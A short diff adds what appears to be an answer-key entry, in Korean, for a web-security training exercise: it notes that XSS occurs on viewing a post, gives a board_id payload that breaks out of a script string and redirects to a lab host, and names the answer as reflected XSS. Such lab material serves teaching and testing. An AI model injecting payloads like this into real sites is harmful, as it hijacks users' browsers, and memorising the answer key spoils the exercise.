@@ -1,0 +1,5 @@
+게시글 접근 시 XSS발생
+공격 벡터
+board_id=1';%0a}%0awindow.location.href='http://elms2.skinfosec.co.kr:8083/exam18/location.php';%0a{//
+
+정답 : reflected_xss
